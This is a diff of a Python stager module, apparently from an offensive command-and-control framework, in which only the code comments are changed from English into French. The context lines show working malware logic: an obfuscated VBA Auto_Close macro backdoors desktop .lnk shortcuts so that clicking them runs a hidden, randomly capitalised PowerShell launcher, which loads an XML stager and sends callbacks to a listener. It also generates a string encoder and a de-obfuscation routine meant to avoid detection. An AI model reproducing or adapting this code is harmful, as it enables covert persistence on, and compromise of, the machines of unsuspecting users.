@@ -19,7 +19,7 @@ class Stager:
         }
 	xmlVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(5,9)))
 
-        # any options needed by the stager, settable during runtime
+        # toute option nécessaire au stager, paramétrable pendant l'exécution
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
@@ -76,17 +76,17 @@ class Stager:
 
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
+        # enregistrer une copie de l'objet mainMenu pour accéder à une fonctionnalité externe
+        #   comme les auditeurs / les agents de traitement / etc.
         self.mainMenu = mainMenu
         
         for param in params:
-            # parameter format is [Name, Value]
+            # Le format des paramètres est [Name, Value]
             option, value = param
             if option in self.options:
                 self.options[option]['Value'] = value
 
-    #encoder method used to obfuscate strings that are placed in the macro
+    #méthode de codage utilisée pour obscurcir les chaînes de caractères placées dans la macro
     @staticmethod
     def encoder(strIn):
 	encStr = []
@@ -105,7 +105,7 @@ class Stager:
 
     def generate(self):
 
-        # setting variables
+        # définir les variables
         language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
@@ -130,7 +130,7 @@ class Stager:
 	offsetVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(10,25)))
 	blockVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(10,25)))
 
-        # generate the launcher
+        # générer le lanceur
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
 	launcher = launcher.split(" ")[-1]
 
@@ -138,7 +138,7 @@ class Stager:
             print helpers.color("[!] Error in launcher command generation.")
             return ""
         else:
-	#build out the macro - will look for all .lnk files on the desktop, any that it finds it will inspect to determine whether it matches any of the target exe names
+	#construire la macro - recherche tous les fichiers .lnk sur le bureau, tout ce qu'il trouve sera inspecté pour déterminer s'il correspond à l'un des noms d'exe ciblés
             macro = "Sub Auto_Close()\n"
 	    #macro += "Dim " + shellVar + " As Object, " + lnkVar + " as Object, " + blockVar + " as String\n"
 	    macro += "Set " + shellVar + " = CreateObject(" + fncDecryptName + "(\"" + self.encoder("Wscript.Shell") + "\"))\n"
@@ -155,7 +155,7 @@ class Stager:
 	    macro += ") Then\n"
 
 	    
- 	    #writing out and obfuscating the command that will be executed upon clicking the backdoored .lnk 
+ 	    #écrire et obscurcir la commande qui sera exécutée en cliquant sur le bouton "backdoored .lnk 
 	    launchString1 = " -w hidden -nop -command \"[System.Diagnostics.Process]::Start(\'" 
 	    launchString2 = "& " + lnkVar + ".targetPath & "
 	    launchString3 = "\');$u=New-Object -comObject wscript.shell;Get-ChildItem -Path $env:USERPROFILE\desktop -Filter *.lnk | foreach { $lnk = $u.createShortcut($_.FullName); if($lnk.arguments -like \'*xml.xmldocument*\') {$start = $lnk.arguments.IndexOf(\'\'\'\') + 1; $result = $lnk.arguments.Substring($start, $lnk.arguments.IndexOf(\'\'\'\', $start) - $start );$lnk.targetPath = $result; $lnk.Arguments = \'\'; $lnk.Save()}};$b = New-Object System.Xml.XmlDocument;$b.Load(\'"
@@ -167,14 +167,14 @@ class Stager:
 	    launchString4 = helpers.randomize_capitalization(launchString4)
 	    
 
-	    #the encoded script gets long, this snippet chunks data to a more manageable size, keeps vbscript from erroring out due to a line over 1023 chars
+	    #le script encodé devient plus long, cet extrait réduit les données à une taille plus gérable, empêche vbscript de faire des erreurs en raison d'une ligne de plus de 1023 caractères
 	    chunks = list(helpers.chunks(self.encoder(launchString3 + XmlPath + launchString4), random.randint(600,750)))
             macro += blockVar + " = \"" + str(chunks[0]) + "\"\n"
             for chunk in chunks[1:]:
                 macro += blockVar + " = " + blockVar + " + \"" + str(chunk) + "\"\n"
 
 
-	    #part of the macro that actually modifies the LNK files on the desktop, sets iconlocation for updated lnk to the old targetpath, args to our launch code, and target to powershell so we can do a direct call to it
+	    #une partie de la macro qui modifie effectivement les fichiers LNK sur le bureau, définit l'iconlocation de lnk mis à jour vers l'ancien chemin cible, les args vers notre code de lancement, et la cible vers powerhell afin que nous puissions l'appeler directement
 	    macro += lnkVar +".IconLocation = " + lnkVar + ".targetpath\n"
 	    launchString = fncDecryptName + "(\"" + self.encoder(launchString1) + "\")" + launchString2 + fncDecryptName + "(" + blockVar + ")\n"
 	    macro += lnkVar + ".arguments = " + launchString
@@ -185,7 +185,7 @@ class Stager:
 	    macro += "next " + fileVar + "\n"
             macro += "End Sub\n\n"
 
-#de-obfuscation function written into macro, this is called at the macro's runtime and converts obfuscated text back to ascii
+#de-obfuscation écrite dans la macro, celle-ci est appelée au moment de l'exécution de la macro et reconvertit le texte obscurci en ascii
 	    macro += "Function " + fncDecryptName + "(" + encStrVar + ") as String\n"
 	    macro += "Dim " + tempStrVar + ", " + shiftVar + ", " + offsetVar + "\n"
 	    macro += shiftVar + " = CLng(\"&H\" & Left(" + encStrVar + ", 1))\n"
@@ -197,7 +197,7 @@ class Stager:
 	    macro += "End Function"
 
 
-#writes XML intermediate stager to disk
+#écrit un stager intermédiaire XML sur le disque
 	    print("Writing xml...\n")
 	    f = open(XmlOut,"w")
 	    f.write("<?xml version=\"1.0\"?>\n")
